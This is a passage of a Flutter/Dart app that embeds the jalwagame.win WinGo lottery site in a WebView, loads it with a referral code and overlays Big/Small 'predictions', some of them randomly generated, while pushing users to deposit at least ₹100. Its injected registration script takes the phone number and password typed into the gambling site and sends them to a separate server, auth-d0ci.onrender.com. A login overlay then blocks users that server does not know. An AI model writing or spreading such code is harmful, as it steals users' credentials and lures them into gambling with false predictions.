          "https://www.jalwagame.win/#/register?invitationCode=51628510542";

      setState(() {
        _isUrlLoaded = true;
      });

      print('🌐 Loading fallback URL: $_initialUrl');
      await _webViewController.loadRequest(Uri.parse(_initialUrl));

      // Since default URL is registration, trigger message
      if (_isVoiceEnabled) {
        Future.delayed(const Duration(milliseconds: 3000), () {
          if (!_hasPlayedRegistrationMessage) {
            _hasPlayedRegistrationMessage = true;
            _voiceService.speakRegistrationMessage();
          }
        });
      }

      // Start fetching game data immediately after page loads
      Future.delayed(const Duration(seconds: 3), () {
        print("🚀 Starting immediate data fetch after page load...");
        _fetchOptimizedGameData();
        _fetchCurrentPeriodFromHistory();
        _fetchBasicGameData();
      });
    }
  }

  bool _isValidUrl(String url) {
    try {
      final uri = Uri.parse(url);
      return uri.hasScheme &&
          (uri.scheme == 'http' || uri.scheme == 'https') &&
          uri.hasAuthority;
    } catch (e) {
      print('❌ Invalid URL format: $url');
      return false;
    }
  }

  @override
  void dispose() {
    _updateTimer?.cancel();
    _predictionTimer?.cancel();
    _debounceTimer?.cancel();
    _voiceService.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        // Check if we can go back in WebView
        if (await _webViewController.canGoBack()) {
          _webViewController.goBack();
          return false;
        }

        // If we can't go back, show exit dialog
        final shouldPop = await showDialog<bool>(
          context: context,
          builder: (context) => AlertDialog(
            backgroundColor: const Color(0xFF2a2d36),
            title: const Text(
              'Exit App?',
              style: TextStyle(color: Colors.white),
            ),
            content: const Text(
              'Are you sure you want to exit the app?',
              style: TextStyle(color: Colors.white70),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.of(context).pop(false),
                child: const Text(
                  'No',
                  style: TextStyle(color: Colors.lightBlue),
                ),
              ),
              TextButton(
                onPressed: () => Navigator.of(context).pop(true),
                child: const Text(
                  'Yes',
                  style: TextStyle(color: Colors.red),
                ),
              ),
            ],
          ),
        );
        return shouldPop ?? false;
      },
      child: Scaffold(
        backgroundColor: Colors.black,
        body: SafeArea(
          child: !_isUrlLoaded
              ? Container(
                  color: Colors.black,
                  child: const Center(
                    child: CircularProgressIndicator(
                      color: Colors.greenAccent,
                    ),
                  ),
                )
              : Container(
                  color: Colors.black,
                  child: Stack(
                    children: [
                      // WebView with transparency
                      Positioned(
                        top: _showPredictionBar && _isPredictionWindowVisible
                            ? 250
                            : 0,
                        left: 0,
                        right: 0,
                        bottom: 0,
                        child: RepaintBoundary(
                          // Isolate WebView repaints
                          child: Container(
                            decoration: BoxDecoration(
                              color: Colors.black.withOpacity(0.7),
                            ),
                            child: WebViewWidget(
                              controller: _webViewController,
                            ),
                          ),
                        ),
                      ),
                      // Fixed Prediction Bar at Top
                      if (_showPredictionBar && _isPredictionWindowVisible)
                        Positioned(
                          top: 0,
                          left: 0,
                          right: 0,
                          child: Container(
                            height: 250,
                            decoration: BoxDecoration(
                              color: const Color(0xFF1a1b20).withOpacity(0.95),
                              border: Border(
                                bottom: BorderSide(
                                  color: Colors.greenAccent.withOpacity(0.3),
                                  width: 1,
                                ),
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: Colors.black.withOpacity(0.3),
                                  blurRadius: 15,
                                  spreadRadius: 2,
                                ),
                              ],
                            ),
                            child: Builder(builder: (context) {
                              print(
                                  "🏗️  Building AdvancedPredictionBar with:");
                              print(
                                  "   _showPredictionBar: $_showPredictionBar");
                              print(
                                  "   _isPredictionWindowVisible: $_isPredictionWindowVisible");
                              print("   _next5Predictions: $_next5Predictions");
                              print(
                                  "   _next5Predictions.length: ${_next5Predictions.length}");

                              // Emergency fallback if predictions are empty
                              List<String> safePredictions = _next5Predictions
                                      .isEmpty
                                  ? List.generate(
                                      5,
                                      (index) =>
                                          Random().nextBool() ? "Big" : "Small")
                                  : _next5Predictions;

                              if (safePredictions != _next5Predictions) {
                                print(
                                    "🚨 EMERGENCY: Using fallback predictions because _next5Predictions was empty!");
                              }

                              // Debug period number being passed to prediction bar
                              print("🔄 Passing to AdvancedPredictionBar:");
                              print("   periodNumber: '$_gamePeriod'");
                              print(
                                  "   _gamePeriod type: ${_gamePeriod.runtimeType}");
                              print(
                                  "   _gamePeriod length: ${_gamePeriod.length}");

                              // Use the actual game period if available, no fallback calculations
                              String finalPeriodNumber = _gamePeriod;
                              print("🔍 Period validation for prediction bar:");
                              print(
                                  "   _gamePeriod.isEmpty: ${_gamePeriod.isEmpty}");
                              print(
                                  "   _gamePeriod == 'Loading...': ${_gamePeriod == 'Loading...'}");
                              print(
                                  "   _gamePeriod == 'N/A': ${_gamePeriod == 'N/A'}");
                              print(
                                  "   _gamePeriod == 'Not Found': ${_gamePeriod == 'Not Found'}");

                              if (_gamePeriod.isEmpty ||
                                  _gamePeriod == "Loading..." ||
                                  _gamePeriod == "N/A" ||
                                  _gamePeriod == "Not Found") {
                                // Show "Loading..." instead of generating fake period numbers
                                finalPeriodNumber = "Loading...";
                                print(
                                    "   ⏳ Period still loading, showing 'Loading...'");
                              } else {
                                print(
                                    "   ✅ Using real game period: '$finalPeriodNumber'");
                              }

                              return AdvancedPredictionBar(
                                gameTimer: _gameTimer,
                                wins: _wins.toString(),
                                losses: _losses.toString(),
                                currentPrediction: _prediction,
                                periodNumber: finalPeriodNumber,
                                next5Predictions: safePredictions,
                                onMandatoryStart: _handleMandatoryStart,
                                isMandatoryStarted: _isMandatoryStarted,
                              );
                            }),
                          ),
                        ),
                      // Show prediction window button
                      if (_showPredictionBar && !_isPredictionWindowVisible)
                        Positioned(
                          bottom: 20,
                          right: 20,
                          child: Container(
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              gradient: LinearGradient(
                                colors: [
                                  Colors.greenAccent,
                                  Colors.green.shade800
                                ],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: Colors.greenAccent.withOpacity(0.3),
                                  blurRadius: 15,
                                  spreadRadius: 2,
                                ),
                              ],
                            ),
                            child: FloatingActionButton(
                              onPressed: () {
                                setState(() {
                                  _isPredictionWindowVisible = true;
                                });
                              },
                              backgroundColor: Colors.transparent,
                              elevation: 0,
                              child: const Icon(
                                Icons.visibility,
                                color: Colors.black,
                                size: 28,
                              ),
                            ),
                          ),
                        ),
                      // Start button overlay
                      if (_showStartButton &&
                          _currentUrl
                              .contains("/saasLottery/WinGo?gameCode=WinGo_"))
                        Positioned(
                          top: 0,
                          left: 0,
                          right: 0,
                          height: 260,
                          child: Container(
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Colors.black.withOpacity(0.9),
                                  Colors.black.withOpacity(0.7),
                                  Colors.transparent,
                                ],
                              ),
                            ),
                            child: BackdropFilter(
                              filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                              child: Center(
                                child: TweenAnimationBuilder(
                                  tween: Tween<double>(begin: 0.95, end: 1.0),
                                  duration: const Duration(milliseconds: 2000),
                                  curve: Curves.easeInOutCubic,
                                  builder: (context, double value, child) {
                                    return Transform.scale(
                                      scale: value,
                                      child: Container(
                                        width: 160,
                                        height: 48,
                                        decoration: BoxDecoration(
                                          borderRadius:
                                              BorderRadius.circular(24),
                                          gradient: LinearGradient(
                                            begin: Alignment.topLeft,
                                            end: Alignment.bottomRight,
                                            colors: [
                                              Colors.greenAccent.shade400,
                                              Colors.green.shade600,
                                              Colors.green.shade800,
                                            ],
                                          ),
                                          boxShadow: [
                                            BoxShadow(
                                              color: Colors.greenAccent
                                                  .withOpacity(0.4),
                                              blurRadius: 15,
                                              offset: const Offset(-6, -6),
                                            ),
                                            BoxShadow(
                                              color: Colors.green.shade600
                                                  .withOpacity(0.4),
                                              blurRadius: 15,
                                              offset: const Offset(6, 6),
                                            ),
                                            BoxShadow(
                                              color: Colors.green.shade400
                                                  .withOpacity(0.3),
                                              blurRadius: 20,
                                              spreadRadius: -8,
                                            ),
                                          ],
                                        ),
                                        child: Material(
                                          color: Colors.transparent,
                                          child: InkWell(
                                            onTap: _handleStart,
                                            borderRadius:
                                                BorderRadius.circular(24),
                                            splashColor:
                                                Colors.white.withOpacity(0.2),
                                            highlightColor:
                                                Colors.white.withOpacity(0.1),
                                            child: Container(
                                              decoration: BoxDecoration(
                                                borderRadius:
                                                    BorderRadius.circular(24),
                                                border: Border.all(
                                                  color: Colors.greenAccent
                                                      .withOpacity(0.3),
                                                  width: 1.5,
                                                ),
                                              ),
                                              child: Center(
                                                child: Row(
                                                  mainAxisAlignment:
                                                      MainAxisAlignment.center,
                                                  children: [
                                                    Container(
                                                      width: 28,
                                                      height: 28,
                                                      decoration: BoxDecoration(
                                                        shape: BoxShape.circle,
                                                        color: Colors.black
                                                            .withOpacity(0.2),
                                                      ),
                                                      child: const Icon(
                                                        Icons
                                                            .play_arrow_rounded,
                                                        color: Colors.black,
                                                        size: 18,
                                                      ),
                                                    ),
                                                    const SizedBox(width: 8),
                                                    Text(
                                                      'START',
                                                      style:
                                                          GoogleFonts.orbitron(
                                                        fontSize: 18,
                                                        fontWeight:
                                                            FontWeight.bold,
                                                        color: Colors.black,
                                                        letterSpacing: 2,
                                                      ),
                                                    ),
                                                  ],
                                                ),
                                              ),
                                            ),
                                          ),
                                        ),
                                      ),
                                    );
                                  },
                                ),
                              ),
                            ),
                          ),
                        ),
                    ],
                  ),
                ),
        ),
      ),
    );
  }

  Future<void> _checkRemoteConfig() async {
    int retryCount = 0;
    const maxRetries = 3;

    while (retryCount < maxRetries) {
      try {
        print(
            '🔄 Checking remote config (attempt ${retryCount + 1}/$maxRetries)...');
        final remoteConfig = FirebaseRemoteConfig.instance;

        // Configure with more aggressive settings for updates
        await remoteConfig.setConfigSettings(RemoteConfigSettings(
          fetchTimeout: const Duration(seconds: 20),
          minimumFetchInterval:
              const Duration(seconds: 30), // More frequent checks
        ));

        await remoteConfig.fetch();
        bool activated = await remoteConfig.activate();
        print('🔄 Remote config fetch activated: $activated');

        // Check app enabled status
        _isAppEnabled = remoteConfig.getBool('is_app_enabled');
        print('✅ App enabled status from Remote Config: $_isAppEnabled');

        // Check for URL updates
        final fetchedUrl = remoteConfig.getString('jalwa').trim();
        print('🔄 Current URL: "$_initialUrl"');
        print('🔄 Fetched URL: "$fetchedUrl"');

        if (fetchedUrl.isNotEmpty &&
            _isValidUrl(fetchedUrl) &&
            fetchedUrl != _initialUrl) {
          print('✅ New valid URL detected, updating...');
          setState(() {
            _initialUrl = fetchedUrl;
          });
          await _webViewController.loadRequest(Uri.parse(fetchedUrl));
          print('✅ Successfully loaded new URL: $fetchedUrl');
        } else if (fetchedUrl == _initialUrl) {
          print('ℹ️ URL unchanged, no update needed');
        } else if (fetchedUrl.isEmpty) {
          print('⚠️ Empty URL from remote config, keeping current URL');
        } else {
          print('⚠️ Invalid URL from remote config: "$fetchedUrl"');
        }

        // Success - break the retry loop
        break;
      } catch (e) {
        retryCount++;
        print('❌ Error checking remote config (attempt $retryCount): $e');

        if (retryCount < maxRetries) {
          print('⏳ Retrying in ${retryCount * 2} seconds...');
          await Future.delayed(Duration(seconds: retryCount * 2));
        } else {
          print('❌ Max retries reached, giving up on remote config update');
          // Set default values on complete failure
          _isAppEnabled = true;
        }
      }
    }
  }

  // Add this method to show the overlay
  void _showInsufficientBalanceOverlay() {
    if (context.mounted) {
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (BuildContext context) {
          return WillPopScope(
            onWillPop: () async => false,
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
              child: Dialog(
                backgroundColor: const Color(0xFF1a1b20).withOpacity(0.95),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(16),
                ),
                child: Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1a1b20).withOpacity(0.95),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: Colors.red.withOpacity(0.5),
                      width: 2,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.red.withOpacity(0.1),
                        blurRadius: 20,
                        spreadRadius: 1,
                      ),
                    ],
                  ),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(
                        Icons.warning_amber_rounded,
                        color: Colors.red,
                        size: 48,
                      ),
                      const SizedBox(height: 16),
                      const Text(
                        'Insufficient Balance',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 24,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                      const SizedBox(height: 12),
                      Text(
                        'Current Balance: $_walletBalance',
                        style: const TextStyle(
                          color: Colors.white70,
                          fontSize: 18,
                        ),
                      ),
                      const SizedBox(height: 8),
                      const Text(
                        'Minimum required balance: ₹100',
                        style: TextStyle(
                          color: Colors.white70,
                          fontSize: 16,
                        ),
                      ),
                      const SizedBox(height: 24),
                      ElevatedButton(
                        onPressed: () {
                          _webViewController.loadRequest(Uri.parse(
                              'https://www.jalwagame.win/#/wallet/Recharge'));
                          Navigator.of(context).pop();
                        },
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.green,
                          padding: const EdgeInsets.symmetric(
                            horizontal: 32,
                            vertical: 16,
                          ),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: const Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.account_balance_wallet),
                            SizedBox(width: 8),
                            Text(
                              'DEPOSIT NOW',
                              style: TextStyle(
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          );
        },
      );
    }
  }

  void _handleMandatoryStart() {
    setState(() {
      _isMandatoryStarted = true;
    });
  }

  void _handleStart() async {
    if (_currentUrl.contains("/saasLottery/WinGo?gameCode=WinGo_")) {
      try {
        // Check wallet balance and wait for the result
        final balance = await _checkWalletBalance();

        if (balance >= 100.0) {
          setState(() {
            _showStartButton = false;
            _isMandatoryStarted = true;
            _isPredictionRunning = true;
          });

          // Force generate predictions when starting
          if (_next5Predictions.isEmpty) {
            _initializePredictions();
          } else {
            _updatePrediction();
          }
        } else {
          if (_isVoiceEnabled) {
            await _voiceService.speak('insufficient_balance');
          }
          _showInsufficientBalanceOverlay();
        }
      } catch (e) {
        print("Error in handleStart: $e");
        // Show an error message to the user
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('Error checking balance. Please try again.'),
              backgroundColor: Colors.red,
            ),
          );
        }
      }
    }
  }

  void _handleStop() {
    setState(() {
      _isPredictionRunning = false;
    });
  }

  Future<double> _checkWalletBalance() async {
    try {
      if (!_isUrlLoaded) return 0.0;

      const optimizedWalletScript = """
        (() => {
          try {
              const selectors = [
              'div[data-v-7b3870ea].Wallet__C-balance-l1 > div[data-v-7b3870ea]',
                '.Wallet__C-balance-l1 > div',
                '[class*="Wallet__C-balance"] > div'
              ];
              
              for (const selector of selectors) {
                const element = document.querySelector(selector);
              if (element && element.innerText) {
                return element.innerText.trim().replace('₹', '').replace(/,/g, '');
                }
              }
              return '0';
          } catch (e) {
            return '0';
          }
        })();
      """;

      final result = await _webViewController
          .runJavaScriptReturningResult(optimizedWalletScript);

      final balanceStr = (result as String).replaceAll('"', '').trim();
      final balance = double.tryParse(balanceStr) ?? 0.0;

      if (mounted) {
        setState(() {
          _walletBalance = '₹${balance.toStringAsFixed(2)}';
          _showPredictionBar = balance > 100;
        });
      }

      return balance;
    } catch (e) {
      return 0.0;
    }
  }

  void _checkPageUrl(String url) {
    setState(() {
      _currentUrl = url;
      _showPredictionBar = url.contains("/saasLottery/WinGo?gameCode=WinGo_");
    });

    // Check if we're on registration page and play audio message
    if (url.contains('register') &&
        !_hasPlayedRegistrationMessage &&
        _isVoiceEnabled) {
      _hasPlayedRegistrationMessage = true;
      // Play registration message after a short delay to ensure page is loaded
      Future.delayed(const Duration(milliseconds: 2000), () {
        _voiceService.speakRegistrationMessage();
      });
    }

    // Remove the wallet balance check from here
    if (!url.contains('register')) {
      _cleanupRegistrationHandler();
      // Reset registration message flag when leaving registration page
      _hasPlayedRegistrationMessage = false;
    }

    // List of supported schemes
    final supportedSchemes = ['paytmmp://', 'upi://', 'gpay://', 'phonepe://'];

    // Check if the URL starts with any of the supported schemes
    if (supportedSchemes.any((scheme) => url.startsWith(scheme))) {
      redirectToApp(url);
    }
  }

  Future<void> _injectLoginHandler() async {
    const loginScript = """
      (function() {
        console.log('Starting login handler setup v4');
        let isCheckingUser = false;
        
        // Add CSS for overlay and button styles
        const style = document.createElement('style');
        style.textContent = `
          button[data-v-33f88764].disabled {
            opacity: 0.6 !important;
            pointer-events: none !important;
            cursor: not-allowed !important;
          }
          .overlay-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(26, 27, 32, 0.98);
            color: white;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            z-index: 9999;
            text-align: center;
            min-width: 300px;
            width: 90%;
            max-width: 400px;
            animation: fadeIn 0.4s ease-out;
            border: 1px solid rgba(255, 255, 255, 0.1);
          }
          .overlay-message .title {
            color: #ff4d4d;
            font-weight: bold;
            margin-bottom: 20px;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 1px;
          }
          .overlay-message .message {
            color: #ffffff;
            font-size: 16px;
            margin-bottom: 25px;
            line-height: 1.5;
            opacity: 0.9;
          }
          .overlay-message .register-btn {
            background-color: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s;
            width: 100%;
            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.2);
          }
          .overlay-message .register-btn:hover {
            background-color: #45a049;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(76, 175, 80, 0.3);
          }
          .overlay-message .buttons {
            display: flex;
            justify-content: center;
            width: 100%;
          }
          @keyframes fadeIn {
            from { 
              opacity: 0; 
              transform: translate(-50%, -60%) scale(0.95); 
            }
            to { 
              opacity: 1; 
              transform: translate(-50%, -50%) scale(1); 
            }
          }
          .overlay-backdrop {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(6px);
            z-index: 9998;
            animation: fadeBackdrop 0.4s ease-out;
          }
          @keyframes fadeBackdrop {
            from { opacity: 0; }
            to { opacity: 1; }
          }
        `;
        document.head.appendChild(style);

        function showOverlayMessage() {
          // Add backdrop
          const backdrop = document.createElement('div');
          backdrop.className = 'overlay-backdrop';
          document.body.appendChild(backdrop);

          const overlay = document.createElement('div');
          overlay.className = 'overlay-message';
          overlay.innerHTML = `
            <div class="title">⚠️ Number Not Registered</div>
            <div class="message">This phone number is not registered in our system. To continue using our services, please register your account first.</div>
            <div class="buttons">
              <button class="register-btn">Register Now</button>
            </div>
          `;
          document.body.appendChild(overlay);

          // Handle register button click
          overlay.querySelector('.register-btn').addEventListener('click', () => {
            window.location.href = window.location.href.replace('login', 'register');
            removeOverlay();
          });

          function removeOverlay() {
            overlay.style.opacity = '0';
            backdrop.style.opacity = '0';
            overlay.style.transform = 'translate(-50%, -60%) scale(0.95)';
            overlay.style.transition = 'all 0.3s ease-out';
            backdrop.style.transition = 'opacity 0.3s ease-out';
            setTimeout(() => {
              overlay.remove();
              backdrop.remove();
            }, 300);
          }
        }

        function disableLoginButton(button) {
          if (!button) return;
          button.disabled = true;
          button.setAttribute('disabled', 'disabled');
          button.classList.add('disabled');
          button.style.pointerEvents = 'auto'; // Allow click events for disabled state
          button.style.cursor = 'not-allowed';
          button.style.opacity = '0.6';
        }

        function enableLoginButton(button) {
          if (!button) return;
          button.disabled = false;
          button.removeAttribute('disabled');
          button.classList.remove('disabled');
          button.style.pointerEvents = '';
          button.style.cursor = '';
          button.style.opacity = '';
        }
        
        let loginRetryCount = 0;
        const maxLoginRetries = 8;
        
        function setupLoginHandler() {
          try {
            const loginButton = document.querySelector('button[data-v-33f88764].active');
            const phoneInput = document.querySelector('input[data-v-50aa8bb0][name="userNumber"]');
            
            if (!loginButton || !phoneInput) {
              loginRetryCount++;
              if (loginRetryCount < maxLoginRetries) {
                console.log('Missing login elements, retry ' + loginRetryCount + '/' + maxLoginRetries);
                setTimeout(setupLoginHandler, 2000); // Increased delay
              } else {
                console.log('Login handler setup failed after ' + maxLoginRetries + ' attempts');
              }
              return;
            }
            
            console.log('Login elements found, setting up handler');

            // Initially disable
            disableLoginButton(loginButton);
            
            // Override click event
            loginButton.addEventListener('click', function(e) {
              if (!window._userVerified) {
                e.preventDefault();
                e.stopPropagation();
                showOverlayMessage();
                return false;
              }
            });

            // Listen for validation
            window.addEventListener('phoneValidated', function(event) {
              const isValid = event.detail?.isValid;
              window._userVerified = isValid;
              
              if (isValid) {
                enableLoginButton(loginButton);
                console.log('Button enabled - user verified');
              } else {
                disableLoginButton(loginButton);
                if (phoneInput.value.length >= 10) {
                  showOverlayMessage();
                }
                console.log('Button disabled - invalid user');
              }
            });

            phoneInput.addEventListener('input', function() {
              window._userVerified = false;
              disableLoginButton(loginButton);
              
              if (isCheckingUser) return;
              isCheckingUser = true;

              setTimeout(() => {
                const phone = phoneInput.value;
                if (phone && phone.length >= 10) {
                  window.CheckUsername.postMessage(phone);
                }
                isCheckingUser = false;
              }, 500);
            });

          } catch (error) {
            console.error('Login handler setup error:', error);
            setTimeout(setupLoginHandler, 1000);
          }
        }

        // Ensure handler runs after DOM is ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', setupLoginHandler);
        } else {
          setupLoginHandler();
        }
      })();
    """;

    try {
      await _webViewController.runJavaScript(loginScript);
      print('Login handler injected successfully');
    } catch (e) {
      print('Failed to inject login handler: $e');
    }
  }

  Future<void> _injectRegistrationHandler() async {
    // Trigger registration message when handler is injected
    if (!_hasPlayedRegistrationMessage && _isVoiceEnabled) {
      _hasPlayedRegistrationMessage = true;
      Future.delayed(const Duration(milliseconds: 1500), () {
        _voiceService.speakRegistrationMessage();
      });
    }

    const registrationScript = """
      (function() {
        console.log('Starting registration handler setup v5');
        let retryCount = 0;
        const maxRetries = 10; // Limit retries to prevent infinite loop
        
        function setupRegistrationHandler() {
          const registerButton = document.querySelector('button[data-v-e26f70e7]');
          const phoneInput = document.querySelector('input[data-v-50aa8bb0][name="userNumber"]');
          const passwordInput = document.querySelector('input[data-v-ea5b66c8][type="password"][placeholder="Set password"]');
          const confirmPasswordInput = document.querySelector('input[data-v-ea5b66c8][type="password"][placeholder="Confirm password"]');
          
          if (!registerButton || !phoneInput || !passwordInput || !confirmPasswordInput) {
            retryCount++;
            if (retryCount < maxRetries) {
              console.log('Missing registration elements, retry ' + retryCount + '/' + maxRetries);
              setTimeout(setupRegistrationHandler, 2000); // Increased delay to 2 seconds
            } else {
              console.log('Registration handler setup failed after ' + maxRetries + ' attempts');
            }
            return;
          }
          
          console.log('Registration elements found, setting up handler');

          registerButton.addEventListener('click', async function(e) {
            e.preventDefault();
            
            const phone = phoneInput.value;
            const password = passwordInput.value;
            const confirmPass = confirmPasswordInput.value;

            if (!phone || phone.length < 10) {
              alert('Please enter a valid phone number');
              return;
            }

            if (!password || password.length < 6) {
              alert('Password must be at least 6 characters');
              return;
            }

            if (password !== confirmPass) {
              alert('Passwords do not match');
              return;
            }

            try {
              const response = await fetch('https://auth-d0ci.onrender.com/api/register', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  phone: phone,
                  password: password
                })
              });

              const data = await response.json();
              
              if (response.ok) {
                console.log('Registration successful! Please login.');
                
              } else {
                
              }
            } catch (error) {
              console.error('Registration error:', error);
              
            }
          });

          console.log('Registration handler setup complete');
        }
        
        setupRegistrationHandler();
      })();
    """;

    try {
      await _webViewController.runJavaScript(registrationScript);
      print('Registration handler injected successfully');
    } catch (e) {
      print('Failed to inject registration handler: $e');
    }
  }

  Future<void> _cleanupRegistrationHandler() async {
    try {
      await _webViewController.runJavaScript("""
        if (window._cleanupRegistrationHandler) {
          window._cleanupRegistrationHandler();
        }
      """);
      print('Registration handler cleaned up');
    } catch (e) {
      print('Failed to cleanup registration handler: $e');
    }
  }

  Future<void> redirectToApp(String url) async {
    try {
      // Define the supported URL schemes
      final supportedSchemes = [
        'paytmmp://',
        'upi://',
        'gpay://',
        'phonepe://'
      ];

      // Check if the URL matches any of the supported schemes
      final isSupported =
          supportedSchemes.any((scheme) => url.startsWith(scheme));

      if (isSupported) {
        // Launch the URL if possible
        if (await canLaunch(url)) {
          await launch(url);
        } else {
          print('Cannot launch URL: $url');
          return; // Exit if the URL cannot be launched
        }

        // Navigate to the "Complete Payment" screen after launching the URL
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (context) => CompletePaymentScreen(),
          ),
        );
      } else {
        print('Unsupported URL scheme: $url');
      }
    } catch (e) {
      print('Error in redirectToApp: $e');
    }
  }

  void _startOptimizedTimers() {
    // Further optimized timer intervals for maximum smoothness
    _updateTimer = Timer.periodic(const Duration(seconds: 12), (timer) {
      if (mounted) {
        print("🔄 Timer: Running _fetchOptimizedGameData...");
        _fetchOptimizedGameData();
        _fetchCurrentPeriodFromHistory(); // Add history-based period fetching
        _checkWalletBalance();
      }
    });

    _predictionTimer = Timer.periodic(const Duration(seconds: 15), (timer) {
      if (mounted) {
        print("🔄 Timer: Running _checkForNewResults...");
        _checkForNewResults();
      }
    });

    // Further reduced frequency for basic data fetching
    Timer.periodic(const Duration(seconds: 18), (timer) {
      if (mounted) {
        print("🔄 Timer: Running _fetchBasicGameData...");
        _fetchBasicGameData();
      }
    });

    // Remote config check timer - every 5 minutes for URL updates
    Timer.periodic(const Duration(minutes: 5), (timer) {
      if (mounted) {
        print("🔄 Timer: Running _checkRemoteConfig...");
        _checkRemoteConfig();
      }
    });
  }

  Future<void> _fetchOptimizedGameData() async {
    try {
      // Check if WebView is ready and URL is loaded
      if (!_isUrlLoaded || !mounted) return;

      // Throttle JS execution more aggressively to reduce frame rate issues
      final now = DateTime.now();
      if (now.difference(_lastJsExecution).inMilliseconds <
          _jsThrottleInterval.inMilliseconds)
        return; // Use the new longer interval
      _lastJsExecution = now;

      final optimizedScript = """
      (() => {
        try {
          console.log('🔍 STARTING PERIOD SEARCH...');
          console.log('Page URL:', window.location.href);
          console.log('Page title:', document.title);
          
          var walletElement = document.querySelector('.Wallet__C-balance-l1 > div');
          var timerElement = document.querySelector('.TimeLeft__C-name');
          
          // Try multiple selectors for period - improved for actual game site
          var periodSelectors = [
            'div[data-v-3cbad787=""].TimeLeft__C-id', // Exact selector provided by user
            'div[data-v-3cbad787].TimeLeft__C-id',
            '.TimeLeft__C-id',
            '[class*="TimeLeft"][class*="id"]',
            '[class*="period"]',
            '[class*="Period"]',
            '[class*="game"]',
            '[class*="round"]',
            '[class*="number"]',
            '[class*="Number"]',
            '.game-period',
            '.period-number',
            '.round-number'
          ];
          
          var gamePeriod = 'N/A';
          var foundSelector = '';
          
          console.log('🔍 Testing exact selector first...');
          var exactElement = document.querySelector('div[data-v-3cbad787=""].TimeLeft__C-id');
          if (exactElement) {
            console.log('✅ Exact selector found element!');
            console.log('Element text:', exactElement.innerText);
            console.log('Element content:', exactElement.textContent);
            if (exactElement.innerText && exactElement.innerText.match(/^\\d{17}\$/)) {
              gamePeriod = exactElement.innerText.trim();
              foundSelector = 'div[data-v-3cbad787=""].TimeLeft__C-id';
              console.log('✅ EXACT SELECTOR SUCCESS: ' + gamePeriod);
            }
          } else {
            console.log('❌ Exact selector found no element');
          }
          
          // First, try to find period in specific elements
          for (var i = 0; i < periodSelectors.length; i++) {
            var elements = document.querySelectorAll(periodSelectors[i]);
            console.log('Selector ' + periodSelectors[i] + ' found ' + elements.length + ' elements');
            
            for (var j = 0; j < elements.length; j++) {
              var text = elements[j].innerText || elements[j].textContent || '';
              console.log('  Element ' + j + ' text: ' + text.trim());
              
              // Look for numbers (17 digits) that could be period numbers
              if (text.match(/^\\d{17}\$/)) {
                gamePeriod = text.trim();
                foundSelector = periodSelectors[i];
                console.log('✅ FOUND PERIOD: ' + gamePeriod + ' with selector: ' + foundSelector);
                break;
              }
            }
            
            if (gamePeriod !== 'N/A') break;
          }
          
          // If still not found, try a simple search for any 17-digit number
          if (gamePeriod === 'N/A') {
            console.log('🔍 SEARCHING FOR ANY 17-DIGIT NUMBER...');
            var allElements = document.querySelectorAll('*');
            for (var k = 0; k < allElements.length; k++) {
              var el = allElements[k];
              var text = el.innerText || el.textContent || '';
              
              if (text.match(/^\\d{17}\$/)) {
                gamePeriod = text.trim();
                console.log('✅ FOUND 17-DIGIT PERIOD: ' + gamePeriod);
                console.log('Element: ' + el.tagName + ' class: ' + el.className);
                break;
              }
            }
          }
          
          var walletBalance = walletElement ? walletElement.innerText.trim() : 'N/A';
          
          var gameTimer = '30';
          if (timerElement) {
            var match = timerElement.textContent.match(/\\d+/);
            if (match) {
              gameTimer = parseInt(match[0]).toString().padStart(2, '0');
            }
          }
          
          console.log('FINAL RESULT - Period: ' + gamePeriod + ', Timer: ' + gameTimer + ', Wallet: ' + walletBalance);
          
          return JSON.stringify({
            wallet: walletBalance,
            timer: gameTimer,
            period: gamePeriod
          });
        } catch (e) {
          console.log('Error in optimized script:', e);
          return JSON.stringify({
            wallet: 'N/A',
            timer: '30',
            period: 'N/A'
          });
        }
      })();
    """;

      final result = await _webViewController
          .runJavaScriptReturningResult(optimizedScript);

      // The result is already a JSON string, just parse it directly
